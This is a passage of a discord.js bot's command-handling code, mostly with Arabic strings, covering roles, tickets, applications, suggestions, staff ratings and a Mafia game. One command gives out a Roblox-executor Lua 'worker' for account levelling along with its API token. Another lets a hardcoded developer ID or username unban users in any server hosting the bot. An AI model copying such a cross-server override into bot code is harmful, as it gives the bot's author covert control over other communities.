        const embed = new EmbedBuilder().setTitle("\u{1F6E0}\uFE0F \u0633\u0643\u0631\u064A\u0628\u062A \u0627\u0644\u0640 VPS (Worker Script)").setDescription("\u0647\u0630\u0627 \u0627\u0644\u0633\u0643\u0631\u064A\u0628\u062A \u0645\u062E\u0635\u0635 \u0644\u0644\u062A\u0634\u063A\u064A\u0644 \u0639\u0644\u0649 \u0627\u0644\u0640 VPS \u0627\u0644\u062E\u0627\u0635 \u0628\u0643 \u062F\u0627\u062E\u0644 Executor \u0631\u0648\u0628\u0644\u0648\u0643\u0633. \u064A\u0642\u0648\u0645 \u0627\u0644\u0633\u0643\u0631\u064A\u0628\u062A \u0628\u0627\u0644\u0627\u062A\u0635\u0627\u0644 \u0628\u0627\u0644\u0628\u0648\u062A \u0648\u0633\u062D\u0628 \u0627\u0644\u062D\u0633\u0627\u0628\u0627\u062A \u0648\u062A\u0644\u0641\u064A\u0644\u0647\u0627 \u062D\u0642\u064A\u0642\u064A\u0627\u064B.").addFields(
          { name: "\u{1F517} \u0631\u0627\u0628\u0637 \u0627\u0644\u0640 API", value: `\`${apiUrl}\`` },
          { name: "\u{1F511} \u0645\u0641\u062A\u0627\u062D \u0627\u0644\u0623\u0645\u0627\u0646 (Token)", value: `\`${workerToken}\`` }
        ).setColor(5793266).setTimestamp();
        await interaction.reply({ embeds: [embed], content: "```lua\n" + luaScript + "\n```", ephemeral: true });
      }
      if (commandName === "unban") {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
        const targetGuildId = interaction.options.getString("server_id");
        const targetUserId = interaction.options.getString("user_id");
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0645\u0648\u062C\u0648\u062F\u0627\u064B \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        await interaction.deferReply();
        try {
          await targetGuild.members.unban(targetUserId);
          await interaction.editReply(`\u2705 \u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646 <@${targetUserId}> \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**.`);
        } catch (error) {
          await interaction.editReply({ content: `\u274C \u0641\u0634\u0644 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646: ${error.message}` });
        }
      }
      if (commandName === "botinfo") {
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor(uptime / 3600) % 24;
        const minutes = Math.floor(uptime / 60) % 60;
        const seconds = Math.floor(uptime % 60);
        const embed = new EmbedBuilder().setTitle("\u{1F940} Requiem Information").setColor("#8B0000").setThumbnail(client.user?.displayAvatarURL() || null).setDescription("A masterpiece of power and elegance. Orchestrating the end of old worlds and the birth of new ones.").addFields(
          { name: "\u{1F4CC} Name", value: `${client.user?.tag}`, inline: true },
          { name: "\u{1F194} ID", value: `${client.user?.id}`, inline: true },
          { name: "\u{1F4C5} Created At", value: `<t:${Math.floor(client.user.createdTimestamp / 1e3)}:R>`, inline: true },
          { name: "\u{1F4DA} Library", value: "discord.js", inline: true },
          { name: "\u{1F522} Version", value: "1.0.0", inline: true },
          { name: "\u{1F310} Servers", value: `${client.guilds.cache.size}`, inline: true },
          { name: "\u{1F465} Users", value: `${client.users.cache.size}`, inline: true },
          { name: "\u23F3 Uptime", value: `${days}d ${hours}h ${minutes}m ${seconds}s`, inline: true },
          { name: "\u26A1 Latency", value: `${client.ws.ping}ms`, inline: true }
        ).setFooter({ text: `Requested by ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() }).setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "add-role") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "\u274C You need 'Manage Roles' permission to use this command.", ephemeral: true });
        }
        const user2 = interaction.options.getUser("user", true);
        const role = interaction.options.getRole("role", true);
        const member = await interaction.guild?.members.fetch(user2.id).catch(() => null);
        if (!member) {
          return interaction.reply({ content: "\u274C User not found in this server.", ephemeral: true });
        }
        const botMember = await interaction.guild?.members.fetch(client.user.id);
        if (botMember && role.position >= botMember.roles.highest.position) {
          return interaction.reply({ content: "\u274C I cannot assign this role because it is higher than or equal to my highest role.", ephemeral: true });
        }
        try {
          await member.roles.add(role.id);
          await interaction.reply({ content: `\u2705 Successfully added the role **${role.name}** to **${user2.tag}**.` });
        } catch (err) {
          console.error("Error adding role:", err);
          await interaction.reply({ content: "\u274C Failed to add the role. Make sure I have enough permissions and my role is above the target role.", ephemeral: true });
        }
      }
      if (commandName === "remove-role") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "\u274C You need 'Manage Roles' permission to use this command.", ephemeral: true });
        }
        const user2 = interaction.options.getUser("user", true);
        const role = interaction.options.getRole("role", true);
        const member = await interaction.guild?.members.fetch(user2.id).catch(() => null);
        if (!member) {
          return interaction.reply({ content: "\u274C User not found in this server.", ephemeral: true });
        }
        const botMember = await interaction.guild?.members.fetch(client.user.id);
        if (botMember && role.position >= botMember.roles.highest.position) {
          return interaction.reply({ content: "\u274C I cannot remove this role because it is higher than or equal to my highest role.", ephemeral: true });
        }
        try {
          await member.roles.remove(role.id);
          await interaction.reply({ content: `\u2705 Successfully removed the role **${role.name}** from **${user2.tag}**.` });
        } catch (err) {
          console.error("Error removing role:", err);
          await interaction.reply({ content: "\u274C Failed to remove the role. Make sure I have enough permissions and my role is above the target role.", ephemeral: true });
        }
      }
      if (commandName === "list-roles") {
        const user2 = interaction.options.getUser("user", true);
        const member = await interaction.guild?.members.fetch(user2.id).catch(() => null);
        if (!member) {
          return interaction.reply({ content: "\u274C User not found in this server.", ephemeral: true });
        }
        const roles = member.roles.cache.filter((role) => role.name !== "@everyone").map((role) => `<@&${role.id}>`).join(", ");
        const embed = new EmbedBuilder().setTitle(`Roles for ${user2.username}`).setDescription(roles || "No roles assigned.").setColor(5793266).setThumbnail(user2.displayAvatarURL()).setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "set-ticket-role") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "You need Administrator permissions.", ephemeral: true });
        }
        const category = interaction.options.getString("category", true);
        const role = interaction.options.getRole("role", true);
        db.prepare("INSERT OR REPLACE INTO ticket_categories (guildId, categoryName, roleId) VALUES (?, ?, ?)").run(guild.id, category, role.id);
        await interaction.reply({ content: `\u2705 Staff role for **${category}** set to ${role}.`, ephemeral: true });
      }
      if (commandName === "apply-settings") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const channel2 = interaction.options.getChannel("channel", true);
        const role = interaction.options.getRole("role", true);
        const staffRole = interaction.options.getRole("staff_role", true);
        const imageUrl = interaction.options.getString("image");
        const questionsStr = interaction.options.getString("questions");
        let questionsJson = null;
        if (questionsStr) {
          const questions = questionsStr.split(",").map((q) => q.trim()).filter((q) => q.length > 0).slice(0, 5);
          questionsJson = JSON.stringify(questions);
        }
        db.prepare("INSERT OR REPLACE INTO apply_settings (guildId, channelId, roleId, staffRoleId, imageUrl, questions, enabled) VALUES (?, ?, ?, ?, ?, ?, ?)").run(guild.id, channel2.id, role.id, staffRole.id, imageUrl, questionsJson, 1);
        await interaction.reply({ content: `\u2705 \u062A\u0645 \u062D\u0641\u0638 \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645:
- \u0627\u0644\u0642\u0646\u0627\u0629: ${channel2}
- \u0627\u0644\u0631\u062A\u0628\u0629: ${role}
- \u0631\u062A\u0628\u0629 \u0627\u0644\u0625\u062F\u0627\u0631\u0629: ${staffRole}${imageUrl ? `
- \u0627\u0644\u0635\u0648\u0631\u0629: [\u0631\u0627\u0628\u0637](${imageUrl})` : ""}${questionsStr ? `
- \u0627\u0644\u0623\u0633\u0626\u0644\u0629: ${questionsStr}` : ""}`, ephemeral: true });
      }
      if (commandName === "setup-apply") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(guild.id);
        if (!settings) {
          return interaction.reply({ content: "\u274C \u064A\u0631\u062C\u0649 \u0636\u0628\u0637 \u0627\u0644\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0623\u0648\u0644\u0627\u064B \u0628\u0627\u0633\u062A\u062E\u062F\u0627\u0645 `/apply-settings`.", ephemeral: true });
        }
        const embed = new EmbedBuilder().setTitle("\u{1F4DD} \u0627\u0644\u062A\u0642\u062F\u064A\u0645 \u0639\u0644\u0649 \u0627\u0644\u0625\u062F\u0627\u0631\u0629 / \u0627\u0644\u0631\u062A\u0628").setDescription("\u0625\u0630\u0627 \u0643\u0646\u062A \u062A\u0631\u063A\u0628 \u0641\u064A \u0627\u0644\u0627\u0646\u0636\u0645\u0627\u0645 \u0625\u0644\u0649 \u0641\u0631\u064A\u0642\u0646\u0627 \u0623\u0648 \u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0631\u062A\u0628\u0629 \u0645\u0639\u064A\u0646\u0629\u060C \u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0644\u062A\u0642\u062F\u064A\u0645.").setColor(65280).setFooter({ text: guild.name, iconURL: guild.iconURL() || void 0 });
        if (settings.imageUrl) {
          embed.setImage(settings.imageUrl);
        }
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("apply_now").setLabel("\u062A\u0642\u062F\u064A\u0645 \u0627\u0644\u0622\u0646").setStyle(ButtonStyle.Primary).setEmoji("\u{1F4DD}")
        );
        await interaction.channel?.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: "\u2705 \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u0642\u062F\u064A\u0645.", ephemeral: true });
      }
      if (commandName === "suggest-settings") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const channel2 = interaction.options.getChannel("channel", true);
        db.prepare("INSERT OR REPLACE INTO suggestion_settings (guildId, channelId, enabled) VALUES (?, ?, ?)").run(guild.id, channel2.id, 1);
        await interaction.reply({ content: `\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062F \u0642\u0646\u0627\u0629 \u0627\u0644\u0627\u0642\u062A\u0631\u0627\u062D\u0627\u062A: ${channel2}`, ephemeral: true });
      }
      if (commandName === "suggest") {
        const settings = db.prepare("SELECT * FROM suggestion_settings WHERE guildId = ?").get(guild.id);
        if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0625\u0639\u062F\u0627\u062F \u0646\u0638\u0627\u0645 \u0627\u0644\u0627\u0642\u062A\u0631\u0627\u062D\u0627\u062A \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        const channel2 = guild.channels.cache.get(settings.channelId);
        if (!channel2) return interaction.reply({ content: "\u274C \u0642\u0646\u0627\u0629 \u0627\u0644\u0627\u0642\u062A\u0631\u0627\u062D\u0627\u062A \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F\u0629.", ephemeral: true });
        const suggestion = interaction.options.getString("suggestion", true);
        const embed = new EmbedBuilder().setAuthor({ name: user.tag, iconURL: user.displayAvatarURL() }).setTitle("\u{1F4A1} \u0627\u0642\u062A\u0631\u0627\u062D \u062C\u062F\u064A\u062F").setDescription(suggestion).setColor(16776960).setTimestamp();
        const msg = await channel2.send({ embeds: [embed] });
        await msg.react("\u2705");
        await msg.react("\u274C");
        await interaction.reply({ content: "\u2705 \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0642\u062A\u0631\u0627\u062D\u0643 \u0628\u0646\u062C\u0627\u062D!", ephemeral: true });
      }
      if (commandName === "eval-settings") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const channel2 = interaction.options.getChannel("channel", true);
        db.prepare("INSERT OR REPLACE INTO evaluation_settings (guildId, channelId, enabled) VALUES (?, ?, ?)").run(guild.id, channel2.id, 1);
        await interaction.reply({ content: `\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062F \u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u0642\u064A\u064A\u0645\u0627\u062A: ${channel2}`, ephemeral: true });
      }
      if (commandName === "rate-staff") {
        const settings = db.prepare("SELECT * FROM evaluation_settings WHERE guildId = ?").get(guild.id);
        if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0625\u0639\u062F\u0627\u062F \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0642\u064A\u064A\u0645 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        const channel2 = guild.channels.cache.get(settings.channelId);
        if (!channel2) return interaction.reply({ content: "\u274C \u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u0642\u064A\u064A\u0645\u0627\u062A \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F\u0629.", ephemeral: true });
        const staff = interaction.options.getUser("staff", true);
        const rating = interaction.options.getInteger("rating", true);
        const feedback = interaction.options.getString("feedback") || "\u0644\u0627 \u064A\u0648\u062C\u062F";
        const stars = "\u2B50".repeat(rating);
        const embed = new EmbedBuilder().setTitle("\u2B50 \u062A\u0642\u064A\u064A\u0645 \u0625\u062F\u0627\u0631\u064A \u062C\u062F\u064A\u062F").addFields(
          { name: "\u0627\u0644\u0625\u062F\u0627\u0631\u064A", value: `${staff} (${staff.tag})`, inline: true },
          { name: "\u0627\u0644\u062A\u0642\u064A\u064A\u0645", value: stars, inline: true },
          { name: "\u0627\u0644\u0645\u0642\u064A\u0645", value: `${user} (${user.tag})`, inline: true },
          { name: "\u0627\u0644\u0645\u0644\u0627\u062D\u0638\u0627\u062A", value: feedback }
        ).setColor(65280).setTimestamp();
        await channel2.send({ embeds: [embed] });
        db.prepare("INSERT INTO evaluations (guildId, userId, staffId, rating, feedback) VALUES (?, ?, ?, ?, ?)").run(guild.id, user.id, staff.id, rating, feedback);
        await interaction.reply({ content: `\u2705 \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u062A\u0642\u064A\u064A\u0645\u0643 \u0644\u0640 **${staff.tag}** \u0628\u0646\u062C\u0627\u062D!`, ephemeral: true });
      }
      if (commandName === "list") {
        const listName = interaction.options.getString("name");
        if (listName) {
          const list = db.prepare("SELECT * FROM custom_lists WHERE guildId = ? AND title = ?").get(guild.id, listName);
          if (!list) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0642\u0627\u0626\u0645\u0629 \u0628\u0647\u0630\u0627 \u0627\u0644\u0627\u0633\u0645.", ephemeral: true });
          const content = JSON.parse(list.content);
          const embed = new EmbedBuilder().setTitle(`\u{1F4CB} ${list.title}`).setDescription(content.join("\n")).setColor(5793266).setTimestamp();
          return interaction.reply({ embeds: [embed] });
        } else {
          const lists = db.prepare("SELECT title FROM custom_lists WHERE guildId = ?").all(guild.id);
          if (lists.length === 0) return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0642\u0648\u0627\u0626\u0645 \u0645\u062E\u0635\u0635\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
          const embed = new EmbedBuilder().setTitle("\u{1F4CB} \u0627\u0644\u0642\u0648\u0627\u0626\u0645 \u0627\u0644\u0645\u062E\u0635\u0635\u0629").setDescription(lists.map((l) => `\u2022 ${l.title}`).join("\n")).setColor(5793266).setTimestamp();
          return interaction.reply({ embeds: [embed] });
        }
      }
      return;
    }
    if (interaction.isModalSubmit()) {
      if (interaction.customId === "apply_modal") {
        const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId);
        if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645.", ephemeral: true });
        const staffChannel = interaction.guild?.channels.cache.get(settings.channelId);
        if (!staffChannel) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0642\u0646\u0627\u0629 \u0627\u0644\u0625\u062F\u0627\u0631\u0629.", ephemeral: true });
        const questions = settings.questions ? JSON.parse(settings.questions) : ["\u0627\u0644\u0627\u0633\u0645", "\u0627\u0644\u0639\u0645\u0631", "\u0627\u0644\u062E\u0628\u0631\u0629 \u0627\u0644\u0633\u0627\u0628\u0642\u0629", "\u0644\u0645\u0627\u0630\u0627 \u062A\u0631\u064A\u062F \u0627\u0644\u0627\u0646\u0636\u0645\u0627\u0645\u061F"];
        const answers = {};
        const embed = new EmbedBuilder().setTitle("\u{1F4DD} \u062A\u0642\u062F\u064A\u0645 \u062C\u062F\u064A\u062F").addFields({ name: "\u0627\u0644\u0645\u0642\u062F\u0645", value: `${interaction.user} (${interaction.user.tag})`, inline: false }).setColor(65535).setTimestamp();
        questions.forEach((q, i) => {
          const answer = interaction.fields.getTextInputValue(`q_${i}`);
          answers[q] = answer;
          embed.addFields({ name: q, value: answer || "\u0644\u0627 \u064A\u0648\u062C\u062F" });
        });
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId(`accept_app_${interaction.user.id}`).setLabel("\u0642\u0628\u0648\u0644").setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`reject_app_${interaction.user.id}`).setLabel("\u0631\u0641\u0636").setStyle(ButtonStyle.Danger)
        );
        await staffChannel.send({ embeds: [embed], components: [row] });
        db.prepare("INSERT INTO applications (guildId, userId, status, answers) VALUES (?, ?, ?, ?)").run(interaction.guildId, interaction.user.id, "pending", JSON.stringify(answers));
        await interaction.reply({ content: "\u2705 \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u062A\u0642\u062F\u064A\u0645\u0643 \u0628\u0646\u062C\u0627\u062D! \u0633\u064A\u062A\u0645 \u0645\u0631\u0627\u062C\u0639\u062A\u0647 \u0645\u0646 \u0642\u0628\u0644 \u0627\u0644\u0625\u062F\u0627\u0631\u0629.", ephemeral: true });
      }
      return;
    }
    if (interaction.isButton()) {
      const game = mafiaGames.get(interaction.guildId || "");
      if (game) {
        const player = game.players.find((p) => p.id === interaction.user.id);
        if (interaction.customId === "mafia_show_role") {
          if (!player) return interaction.reply({ content: "\u274C \u0623\u0646\u062A \u0644\u0633\u062A \u0641\u064A \u0647\u0630\u0647 \u0627\u0644\u0644\u0639\u0628\u0629.", ephemeral: true });
          let roleDesc = "";
          if (player.role === "mafia") roleDesc = "\u0623\u0646\u062A **\u0627\u0644\u0645\u0627\u0641\u064A\u0627**! \u0647\u062F\u0641\u0643 \u0647\u0648 \u0642\u062A\u0644 \u0627\u0644\u062C\u0645\u064A\u0639 \u062F\u0648\u0646 \u0623\u0646 \u064A\u062A\u0645 \u0643\u0634\u0641\u0643.";
          if (player.role === "doctor") roleDesc = "\u0623\u0646\u062A **\u0627\u0644\u0637\u0628\u064A\u0628**! \u064A\u0645\u0643\u0646\u0643 \u062D\u0645\u0627\u064A\u0629 \u0634\u062E\u0635 \u0648\u0627\u062D\u062F \u0643\u0644 \u0644\u064A\u0644\u0629.";
          if (player.role === "detective") roleDesc = "\u0623\u0646\u062A **\u0627\u0644\u0645\u062D\u0642\u0642**! \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0647\u0648\u064A\u0629 \u0634\u062E\u0635 \u0648\u0627\u062D\u062F \u0643\u0644 \u0644\u064A\u0644\u0629.";
          if (player.role === "citizen") roleDesc = "\u0623\u0646\u062A **\u0645\u0648\u0627\u0637\u0646**! \u062D\u0627\u0648\u0644 \u0643\u0634\u0641 \u0627\u0644\u0645\u0627\u0641\u064A\u0627 \u0648\u0627\u0644\u062A\u0635\u0648\u064A\u062A \u0636\u062F\u0647\u0645.";
          return interaction.reply({ content: `\u{1F3AD} \u062F\u0648\u0631\u0643 \u0647\u0648: **${player.role.toUpperCase()}**
${roleDesc}`, ephemeral: true });
        }
        if (interaction.customId.startsWith("mafia_action_")) {
          if (!player || !player.isAlive) return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u0642\u064A\u0627\u0645 \u0628\u0647\u0630\u0627 \u0627\u0644\u0641\u0639\u0644.", ephemeral: true });
          if (game.phase !== "night") return interaction.reply({ content: "\u274C \u0647\u0630\u0647 \u0627\u0644\u0645\u0647\u0645\u0629 \u0645\u062A\u0627\u062D\u0629 \u0641\u064A \u0627\u0644\u0644\u064A\u0644 \u0641\u0642\u0637.", ephemeral: true });
          const alivePlayers = game.players.filter((p) => p.isAlive);
          if (interaction.customId === "mafia_action_mafia") {
            if (player.role !== "mafia") return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u0627\u0641\u064A\u0627 \u0641\u0642\u0637.", ephemeral: true });
            const options = alivePlayers.filter((p) => p.id !== player.id).map((p) => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
            const select = new StringSelectMenuBuilder().setCustomId("mafia_kill").setPlaceholder("\u0627\u062E\u062A\u0631 \u0636\u062D\u064A\u062A\u0643").addOptions(options);
            const row = new ActionRowBuilder().addComponents(select);
            return interaction.reply({ content: "\u{1F52A} \u0627\u062E\u062A\u0631 \u0627\u0644\u0634\u062E\u0635 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0642\u062A\u0644\u0647 \u0627\u0644\u0644\u064A\u0644\u0629:", components: [row], ephemeral: true });
          }
          if (interaction.customId === "mafia_action_doctor") {
            if (player.role !== "doctor") return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0637\u0628\u064A\u0628 \u0641\u0642\u0637.", ephemeral: true });
            const options = alivePlayers.map((p) => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
            const select = new StringSelectMenuBuilder().setCustomId("mafia_save").setPlaceholder("\u0627\u062E\u062A\u0631 \u0634\u062E\u0635\u0627\u064B \u0644\u062D\u0645\u0627\u064A\u062A\u0647").addOptions(options);
            const row = new ActionRowBuilder().addComponents(select);
            return interaction.reply({ content: "\u{1F9EA} \u0627\u062E\u062A\u0631 \u0627\u0644\u0634\u062E\u0635 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062D\u0645\u0627\u064A\u062A\u0647 \u0627\u0644\u0644\u064A\u0644\u0629:", components: [row], ephemeral: true });
          }
          if (interaction.customId === "mafia_action_detective") {
            if (player.role !== "detective") return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u062D\u0642\u0642 \u0641\u0642\u0637.", ephemeral: true });
            const options = alivePlayers.filter((p) => p.id !== player.id).map((p) => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
            const select = new StringSelectMenuBuilder().setCustomId("mafia_check").setPlaceholder("\u0627\u062E\u062A\u0631 \u0634\u062E\u0635\u0627\u064B \u0644\u0644\u062A\u062D\u0642\u0642 \u0645\u0646\u0647").addOptions(options);
            const row = new ActionRowBuilder().addComponents(select);
            return interaction.reply({ content: "\u{1F50D} \u0627\u062E\u062A\u0631 \u0627\u0644\u0634\u062E\u0635 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0647\u0648\u064A\u062A\u0647 \u0627\u0644\u0644\u064A\u0644\u0629:", components: [row], ephemeral: true });
          }
        }
      }
    }
    if (interaction.isStringSelectMenu()) {
      const game = mafiaGames.get(interaction.guildId || "");
      if (game) {
        if (interaction.customId === "mafia_kill") {
          game.nightActions.mafiaTarget = interaction.values[0];
          await interaction.reply({ content: "\u2705 \u062A\u0645 \u0627\u062E\u062A\u064A\u0627\u0631 \u0627\u0644\u0647\u062F\u0641.", ephemeral: true });
          return;
        }
        if (interaction.customId === "mafia_save") {
          game.nightActions.doctorTarget = interaction.values[0];
          await interaction.reply({ content: "\u2705 \u062A\u0645 \u0627\u062E\u062A\u064A\u0627\u0631 \u0627\u0644\u0634\u062E\u0635 \u0644\u062D\u0645\u0627\u064A\u062A\u0647.", ephemeral: true });
          return;
        }
        if (interaction.customId === "mafia_check") {
          const target = game.players.find((p) => p.id === interaction.values[0]);
          await interaction.reply({ content: `\u{1F50D} \u0646\u062A\u064A\u062C\u0629 \u0627\u0644\u062A\u062D\u0642\u0642: **${target?.tag}** \u0647\u0648 **${target?.role === "mafia" ? "\u0645\u0627\u0641\u064A\u0627" : "\u0645\u0648\u0627\u0637\u0646"}**.`, ephemeral: true });
          return;
        }
        if (interaction.customId === "mafia_vote") {
          if (!game.players.find((p) => p.id === interaction.user.id && p.isAlive)) {
            return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u062A\u0635\u0648\u064A\u062A \u0648\u0623\u0646\u062A \u0645\u064A\u062A \u0623\u0648 \u0644\u0633\u062A \u0641\u064A \u0627\u0644\u0644\u0639\u0628\u0629.", ephemeral: true });
          }
          game.votes.set(interaction.user.id, interaction.values[0]);
          await interaction.reply({ content: "\u2705 \u062A\u0645 \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A\u0643.", ephemeral: true });
          return;
        }
      }
    }
    if (interaction.isButton() && interaction.customId === "open_ticket") {
      const guild = interaction.guild;
      if (!guild) return;
      await interaction.deferReply({ ephemeral: true }).catch(console.error);
      if (!guild.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
        return interaction.editReply({ content: "I don't have the 'Manage Channels' and 'Manage Roles' permissions to create a ticket!" }).catch(console.error);
      }
      const existingTicket = db.prepare("SELECT * FROM tickets WHERE userId = ? AND status = 'open'").get(interaction.user.id);
      if (existingTicket) {
        return interaction.editReply({ content: "You already have an open ticket!" }).catch(console.error);
      }
      try {
        const botMember = guild.members.me;
        if (!botMember) return;
        const supportRole = db.prepare("SELECT supportRoleId FROM ticket_settings WHERE guildId = ?").get(guild.id);
        const permissionOverwrites = [
          {
            id: guild.id,
            deny: [PermissionFlagsBits.ViewChannel]
          },
          {
            id: interaction.user.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory]
          },
          {
            id: botMember.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.ManageChannels]
          }
        ];
        if (supportRole) {
          permissionOverwrites.push({
            id: supportRole.supportRoleId,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory]
          });
        }
        const channel = await guild.channels.create({
          name: `ticket-${interaction.user.username}`,
          type: ChannelType.GuildText,
          permissionOverwrites
        });
        db.prepare("INSERT INTO tickets (userId, channelId, status) VALUES (?, ?, 'open')").run(interaction.user.id, channel.id);
        const embed = new EmbedBuilder().setTitle("Ticket Created").addFields(
          { name: "User", value: `${interaction.user}`, inline: true },
          { name: "Category", value: "General", inline: true }
        ).setDescription(`Hello ${interaction.user}, our support team will be with you shortly.
Use \`.close\` to close this ticket.`).setColor(65280).setTimestamp();
        const actionRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("claim_ticket").setLabel("Claim Ticket").setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId("close_ticket").setLabel("Close Ticket").setStyle(ButtonStyle.Danger)
        );
        await channel.send({ content: supportRole ? `<@&${supportRole.supportRoleId}>` : "Support team notified.", embeds: [embed], components: [actionRow] }).catch(console.error);
